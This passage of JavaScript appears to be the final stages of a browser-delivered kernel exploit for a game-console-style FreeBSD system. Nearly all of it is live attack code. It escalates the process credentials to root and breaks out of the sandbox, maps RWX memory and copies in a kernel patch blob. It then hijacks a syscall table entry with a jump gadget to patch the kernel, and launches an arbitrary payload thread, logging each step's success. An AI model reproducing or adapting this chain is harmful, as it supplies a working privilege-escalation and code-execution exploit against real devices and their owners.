                    suNow +
                    " cr_uid=" +
                    rbUid +
                    " cr_prison=" +
                    rbPrison +
                    " fd_rdir=" +
                    rbRdir +
                    " sandbox_after=[" +
                    after.join(" ") +
                    "] escaped=" +
                    (escaped ? 1 : 0),
                );
                check(
                  "JB-ROOT-AND-ESCAPE",
                  jbDone,
                  "getuid=" + uidNow2 + " cr_uid=" + rbUid,
                );
              }
            }

            if (jbDone && DO_PATCH) {
              const jitStub = findStub(0x215),
                kexecStub = findStub(0x295);
              mark(
                "KPATCH-PRE",
                "sites=" +
                  SITES.length +
                  " jitStub=" +
                  (jitStub ? 1 : 0) +
                  " kexecStub=" +
                  (kexecStub ? 1 : 0),
              );
              if (
                check(
                  "kpatch-preconditions",
                  !!kpatchBlob && SITES.length >= 4 && !!jitStub && !!kexecStub,
                  "blob/sites/stubs missing",
                )
              ) {
                if (jbUcred) {
                  write8(jbUcred.add32(0x60), NEG1);
                  write8(jbUcred.add32(0x68), NEG1);
                }
                mark(
                  "JIT-CRED",
                  "caps1=" +
                    (jbUcred ? read8(jbUcred.add32(0x68)) : "n/a") +
                    " geteuid=" +
                    (stGeteuid ? callAddr(stGeteuid, []).i32 : -1),
                );
                const jitFd = callAddr(jitStub, [0, 0x4000, 7]).i32;
                const jitErr = jitFd < 0 ? errno() : 0;
                const KEXEC_MAP = new int64(0x20100000, 9);
                const mm = sc(SYS.mmap, KEXEC_MAP, 0x4000, 7, 0x11, jitFd, 0);
                const mapAddr = new int64(mm.lo, mm.hi);
                const mapErr = mm.i32 === -1 ? errno() : 0;
                const mapOk =
                  jitFd >= 0 && mm.i32 !== -1 && sameI64(mapAddr, KEXEC_MAP);
                mark(
                  "KPATCH-MAP",
                  "jitshm=" +
                    jitFd +
                    " jitErr=" +
                    jitErr +
                    " mmap=" +
                    mapAddr +
                    " mapErr=" +
                    mapErr +
                    " fixed=" +
                    KEXEC_MAP,
                );
                if (
                  check(
                    "kpatch-rwx-map",
                    mapOk,
                    "jitFd=" + jitFd + " jitErr=" + jitErr + " map=" + mapAddr,
                  )
                ) {
                  for (let o = 0; o < kpatchBlob.length; o += 8) {
                    let lo = 0,
                      hi = 0;
                    for (let k = 0; k < 4; k++)
                      lo |= (kpatchBlob[o + k] || 0) << (8 * k);
                    for (let k = 0; k < 4; k++)
                      hi |= (kpatchBlob[o + 4 + k] || 0) << (8 * k);
                    p.write8(mapAddr.add32(o), new int64(lo >>> 0, hi >>> 0));
                  }
                  let copied = true;
                  for (let o = 0; o < kpatchBlob.length && copied; o++)
                    if (p.read1(mapAddr.add32(o)) !== kpatchBlob[o])
                      copied = false;
                  mark(
                    "KPATCH-COPY",
                    "bytes=" +
                      kpatchBlob.length +
                      " copied=" +
                      (copied ? 1 : 0),
                  );
                  if (check("kpatch-blob-copied", copied, "")) {
                    const sysent = KBASE.add32(off.k_sysent_661);
                    const gadget = KBASE.add32(off.k_jmp_rsi);
                    const SV = kview(sysent);
                    const oNarg = SV.getInt32(0);
                    const oCall = SV.getBInt(8);
                    const oThr = SV.getInt32(0x2c);
                    const gb = read8(gadget);
                    const gadgetOk = (gb.low & 0xffff) === 0x26ff;
                    let sitesOk = true;
                    for (const st of SITES) {
                      const b = read8(KBASE.add32(st)).low & 0xff;
                      if (!((b >= 0x70 && b <= 0x7f) || b === 0xeb))
                        sitesOk = false;
                    }
                    mark(
                      "SYSENT-SAVE",
                      "narg=" +
                        oNarg +
                        " call=" +
                        oCall +
                        " thr=" +
                        oThr +
                        " gadget=" +
                        gadget +
                        "(ff26=" +
                        (gadgetOk ? 1 : 0) +
                        ") sitesOk=" +
                        (sitesOk ? 1 : 0),
                    );
                    if (
                      check(
                        "kpatch-arm-gates",
                        gadgetOk &&
                          kptr(oCall) &&
                          sitesOk &&
                          oNarg >= 0 &&
                          oNarg <= 8,
                        "gadget=" +
                          (gadgetOk ? 1 : 0) +
                          " oCall_kptr=" +
                          (kptr(oCall) ? 1 : 0) +
                          " sites=" +
                          (sitesOk ? 1 : 0),
                      )
                    ) {
                      let rc = -1;
                      try {
                        SV.setInt32(0, 2);
                        SV.setBInt(8, gadget);
                        SV.setInt32(0x2c, 1);
                        const armed = sameI64(SV.getBInt(8), gadget);
                        mark(
                          "SYSENT-ARMED",
                          "sy_call=" + SV.getBInt(8) + " ok=" + (armed ? 1 : 0),
                        );
                        if (armed) rc = callAddr(kexecStub, [mapAddr]).i32;
                      } finally {
                        SV.setInt32(0, oNarg);
                        SV.setBInt(8, oCall);
                        SV.setInt32(0x2c, oThr);
                      }
                      let allEb = true;
                      for (const st of SITES)
                        if ((read8(KBASE.add32(st)).low & 0xff) !== 0xeb)
                          allEb = false;
                      const restored =
                        sameI64(SV.getBInt(8), oCall) &&
                        SV.getInt32(0) === oNarg &&
                        SV.getInt32(0x2c) === oThr;
                      kpDone = rc === 0 && allEb && restored;
                      kpatched = kpDone;
                      mark(
                        "KEXEC",
                        "syscall(661)=" +
                          rc +
                          " sites_eb=" +
                          (allEb ? 1 : 0) +
                          " sysent_restored=" +
                          (restored ? 1 : 0),
                      );
                      check(
                        "KERNEL-PATCHED",
                        kpDone,
                        "rc=" +
                          rc +
                          " allEb=" +
                          (allEb ? 1 : 0) +
                          " restored=" +
                          (restored ? 1 : 0),
                      );
                    }
                  }
                }
              }
            }

            let tdOk = false;
            try {
              const TDU = CT1.add32(0x130);
              const before = read8(TDU);
              const wasOk = sameI64(before, UCRED);
              if (!wasOk) write8(TDU, UCRED);
              const after = read8(TDU);
              tdOk = sameI64(after, UCRED);
              mark(
                "JB-TDUCRED",
                "w1.td_ucred=" +
                  before +
                  " want=" +
                  UCRED +
                  " passB_restore_was_exact=" +
                  (wasOk ? 1 : 0) +
                  " repaired=" +
                  (wasOk ? 0 : 1) +
                  " now=" +
                  after,
              );
              check(
                "JB-TDUCRED-CLEAN",
                tdOk,
                "w1.td_ucred must equal the real ucred before this thread is" +
                  " torn down at process exit (crfree runs on it)",
              );
            } catch (e6) {
              tdOk = false;
              mark("JB-TDUCRED-THREW", (e6 && e6.message) || String(e6));
            }

            let restoreOk = true;
            if (jbRestoreHook && !KEEP_JB) {
              restoreOk = !!jbRestoreHook("end-of-run");
            } else if (jbRestoreHook) {
              mark(
                "JB-KEEP",
                "?keepjb=1 -- jailbreak left LIVE. The handles will" +
                  " be restored on pagehide; if the browser is killed instead," +
                  " REBOOT rather than closing it.",
              );
              window.addEventListener("pagehide", function () {
                try {
                  jbRestoreHook("pagehide");
                } catch (e) {}
              });
            }

            const cleanEnough = tdOk && (KEEP_JB || restoreOk);

            if (!cleanEnough) {
              mark(
                "PAYLOAD-SKIPPED",
                "cleanup incomplete (tdOk=" +
                  (tdOk ? 1 : 0) +
                  " restoreOk=" +
                  (restoreOk ? 1 : 0) +
                  ") -- reboot required",
              );
            } else if (
              kpDone &&
              DO_PAYLOAD &&
              payloadBlob &&
              payloadBlob[0] === 0xe9
            ) {
              const sz = (payloadBlob.length + 0x3fff) & ~0x3fff;
              const m = sc(SYS.mmap, 0, sz, 7, 0x1002, -1, 0);
              const entry = new int64(m.lo, m.hi);
              const mErr = m.i32 === -1 ? errno() : 0;
              const entryOk = m.i32 !== -1 && entry.hi >>> 0 > 0;
              mark(
                "PAYLOAD-MAP",
                "mmap(anon,rwx,0x" +
                  sz.toString(16) +
                  ")=" +
                  entry +
                  " err=" +
                  mErr,
              );
              if (
                check(
                  "payload-rwx-map",
                  entryOk,
                  "map=" + entry + " err=" + mErr,
                )
              ) {
                for (let o = 0; o < payloadBlob.length; o += 8) {
                  let lo = 0,
                    hi = 0;
                  for (let k = 0; k < 4; k++)
                    lo |= (payloadBlob[o + k] || 0) << (8 * k);
                  for (let k = 0; k < 4; k++)
                    hi |= (payloadBlob[o + 4 + k] || 0) << (8 * k);
                  p.write8(entry.add32(o), new int64(lo >>> 0, hi >>> 0));
                }
                let bad = -1;
                for (let o = 0; o < payloadBlob.length && bad < 0; o++)
                  if (p.read1(entry.add32(o)) !== payloadBlob[o]) bad = o;
                mark(
                  "PAYLOAD-COPY",
                  "bytes=" +
                    payloadBlob.length +
                    (bad < 0 ? " ok" : " MISMATCH@0x" + bad.toString(16)),
                );
                const slot = webkitBase.add32(off.wk___imp_pthread_create);
                const fn = p.read8(slot);
                const expect = libkernelBase.add32(off.k_pthread_create);
                mark("PTHREAD-RESOLVE", "got=" + fn + " expect=" + expect);
                if (
                  bad < 0 &&
                  check("pthread-got-matches", sameI64(fn, expect), "got=" + fn)
                ) {
                  const thr = new ArrayBuffer(8);
                  keepAlive.push(thr);
                  new Uint8Array(thr).fill(0);
                  const thrAddr = bufAddr(thr);
                  const rc = callAddr(expect, [thrAddr, 0, entry, 0]).i32;
                  const tdv = new DataView(thr);
                  const handle = new int64(
                    tdv.getUint32(0, true),
                    tdv.getUint32(4, true),
                  );
                  plDone = rc === 0 && handle.hi >>> 0 > 0;
                  mark(
                    "PAYLOAD-RUN",
                    "pthread_create=" + rc + " handle=" + handle,
                  );
                  check(
                    "PAYLOAD-RUNNING",
                    plDone,
                    "rc=" + rc + " handle=" + handle,
                  );
                }
              }
            }

            const stable = !!plDone && cleanEnough;
            payloadRunning = stable;

            mark(
              "EG-VERDICT",
              "fw=" +
                fwKey +
                " kernel_base=" +
                KBASE +
                " jailbroken=" +
                (jbDone ? 1 : 0) +
                " kpatched=" +
                (kpDone ? 1 : 0) +
                " payload_running=" +
                (plDone ? 1 : 0) +
                " stable=" +
                (stable ? 1 : 0) +
                " tdOk=" +
                (tdOk ? 1 : 0) +
                " restoreOk=" +
                (restoreOk ? 1 : 0) +
                " armings=" +
                armCount,
            );
            allDone = stable;
          }
        }
      }
    }

    const capsBack =
      CAPS_RESTORE && capsWrote > 0 ? (0x100 - capsWrote) & 0xff : 0;
    const mf3 = multiFire(
      [
        { kind: "sweep", step: O_RAN, probe: OID.add32(0x51), low: 0xffffff },
        { kind: "dec", addr: CAPS_B, n: capsBack },
      ],
      "oid+0x54+caps-restore",
    );
    if (mf3 === null) return;
    const ran = mf3[0];
    mark(
      "KF-RAN",
      "oid+0x54=" +
        (ran.b < 0 ? "NO-MATCH" : "0x" + ran.b.toString(16)) +
        " cands=" +
        ran.n +
        " want=0x1",
    );
    check(
      "KF-UNHIDE-LANDED",
      ran.b === 1 && ran.n === 1,
      "oid+0x54=" +
        ran.b +
        " (1 => sysctl_root passed the visibility" +
        " check, so the .data write at kern.file oid+0x50 landed)",
    );

    let xfData = null,
      xfFile = null,
      kfSeen = 0;
    if (got && got.rv === 0 && got.len >= 0x50) {
      const n = (Math.min(got.len, KF_BYTES) / 0x50) | 0;
      for (let i = 0; i < n; i++) {
        const o = i * 0x50;
        kfSeen++;
        if (kfDv.getUint32(o + 0x00, true) !== 0x50) continue;
        if (kfDv.getInt32(o + 0x08, true) !== pid) continue;
        if (kfDv.getInt32(o + 0x10, true) !== kfSock) continue;
        xfFile = new int64(
          kfDv.getUint32(o + 0x18, true),
          kfDv.getUint32(o + 0x1c, true),
        );
        xfData = new int64(
          kfDv.getUint32(o + 0x38, true),
          kfDv.getUint32(o + 0x3c, true),
        );
        break;
      }
      mark(
        "KF-SCAN",
        "entries=" +
          n +
          " seen=" +
          kfSeen +
          " pid=" +
          pid +
          " fd=" +
          kfSock +
          " xf_file=" +
          xfFile +
          " xf_data=" +
          xfData,
      );
      check("KF-SOCKET-NAMED", !!xfData, "xf_data=" + xfData);
    } else {
      mark(
        "KF-SCAN",
        "skipped rv=" +
          after.rv +
          " errno=" +
          after.err +
          " reason=caps_gate_still_closed_as_predicted",
      );
    }

    mark(
      "KF-VERDICT",
      "fw=" +
        fwKey +
        " kernel_base=" +
        KBASE +
        " anchor_confirmed=" +
        (on.v === KERN_FILE_NUM ? 1 : 0) +
        " unhide_landed=" +
        (ran.b === 1 ? 1 : 0) +
        " sysctl_rv=" +
        after.rv +
        " errno=" +
        after.err +
        " xf_data=" +
        (xfData ? xfData : "none") +
        " armings=" +
        armCount +
        " next=set_cr_sceCaps_bit62_ucred+0x64_bit30",
    );
    mark(
      "KF-DATA-LEFT-DIRTY",
      "oid+0x50 left nonzero and oid+0x51..0x54" +
        " perturbed by the sweep -- .data is reloaded from the boot image," +
        " so REBOOT clears it. No restore attempted on purpose.",
    );

    {
      const nodes =
        256 +
        capsWrote +
        (CAPS_RESTORE && capsWrote > 0 ? 0x100 - capsWrote : 0);
      mark(
        "CAPS-COLLATERAL",
        "caps67_nodes=" +
          nodes +
          " caps1_lo24_delta=-" +
          (nodes >> 8) +
          " exact=" +
          ((nodes & 0xff) === 0 ? 1 : 0) +
          " bits24_63=untouched kind=bitmask_not_pointer" +
          " reboot=restores",
      );
    }
    allDone = true;

    reapNow("final a=" + armCount);
    setNode0(0, N0SINK);
    let renew = 0;
    for (const fd of POOL)
      if (
        sc(SYS.setsockopt, fd, IPPROTO_IPV6, IPV6_RTHDR, pAd, RTH_SIZE).i32 ===
        0
      )
        renew++;
    mark(
      "PR-NEUTRALISE",
      "next=0 on " +
        renew +
        "/" +
        POOL.length +
        "  armings_left_dangling=" +
        armCount +
        "  (workers deliberately NOT terminated: their td_proc is corrupt" +
        " and terminate() would make them syscall)",
    );

    const drWbAb = new ArrayBuffer(NBLOCK * 0x40);
    keepAlive.push(drWbAb);
    const drStAb = new ArrayBuffer(NBLOCK * 4);
    keepAlive.push(drStAb);
    const drStDv = new DataView(drStAb);
    const drStAd = bufAddr(drStAb);
    const drBidAd = bufAddr(bidAb);

    let drGate = true;
    let drGateSt = "";
    const drGatePoll = sc(SYS.aio_multi_poll, idAd2, NUM, stAd2).i32;
    for (let k = 0; k < NUM; k++) {
      const st = stDv2.getUint32(k * 4, true) >>> 0;
      drGateSt += (k ? "," : "") + st.toString(16);
      if ((st & 0xffff) < 3 && (st & 0x80000000) === 0) drGate = false;
    }
    mark(
      "PR-GATE",
      "poll=" +
        drGatePoll +
        " ok=" +
        (drGate ? 1 : 0) +
        " st=[" +
        drGateSt +
        "] rule=every_race_id_terminal_or_gone",
    );

    if (!drGate) {
      mark(
        "PR-DRAIN-SKIPPED",
        "a race request is still live -- workers NOT released",
      );
    } else {
      const drWr = sc(SYS.write, bsp1, bufAddr(drWbAb), NBLOCK * 0x40).i32;
      let drSpins = 0;
      let drDone = 0;
      for (; drSpins < 200; drSpins++) {
        sc(SYS.aio_multi_poll, drBidAd, NBLOCK, drStAd);
        drDone = 0;
        for (let k = 0; k < NBLOCK; k++)
          if ((drStDv.getUint32(k * 4, true) & 0xffff) >= 3) drDone++;
        if (drDone === NBLOCK) break;
      }
      let drSt = "";
      for (let k = 0; k < NBLOCK; k++)
        drSt +=
          (k ? "," : "") + (drStDv.getUint32(k * 4, true) >>> 0).toString(16);
      const drDel = sc(SYS.aio_multi_delete, drBidAd, NBLOCK, drStAd).i32;
      mark(
        "PR-DRAIN",
        "wr=" +
          drWr +
          " done=" +
          drDone +
          "/" +
          NBLOCK +
          " spins=" +
          drSpins +
          " st=[" +
          drSt +
          "] del=" +
          drDel,
      );
    }
  } catch (e) {
    mark("THREW", e && e.message ? e.message : String(e));
    state("threw", "bad");
  } finally {
    try {
      if (jbRestoreHook) jbRestoreHook("finally");
    } catch (e5) {
      mark("JB-RESTORE-THREW", (e5 && e5.message) || String(e5));
    }
    try {
      if (opened.length && closeFd && mainArmed) {
        let n = 0;
        for (const fd of opened) if (closeFd(fd) === 0) n++;
        mark("STRAGGLERS-CLOSED", n + "/" + opened.length);
      }
    } catch (e3) {
      mark("CLOSE-THREW", (e3 && e3.message) || String(e3));
    }
    try {
      if (pinRestore) pinRestore();
    } catch (e4) {
      mark("PIN-RESTORE-THREW", (e4 && e4.message) || String(e4));
    }
    try {
      if (mainArmed && mainMf && mainOrig && p) {
        p.write8(mainMf, mainOrig);
        mainArmed = false;
        mark("EXPM1-RESTORED", "expm1(1)=" + Math.expm1(1));
      }
    } catch (e2) {
      mark("DISARM-THREW", (e2 && e2.message) || String(e2));
    }

    try {
      if (typeof A !== "undefined" && A) A.busy = 0;
    } catch (e) {}
    mark(
      "PROOF-SUMMARY-FINAL",
      "pass=" +
        passCount +
        " fail=" +
        failCount +
        (allDone ? "" : "  INCOMPLETE"),
    );
    try {
      if (!alreadyLoaded) finishUI(payloadRunning);
    } catch (eUI) {}
  }
})();
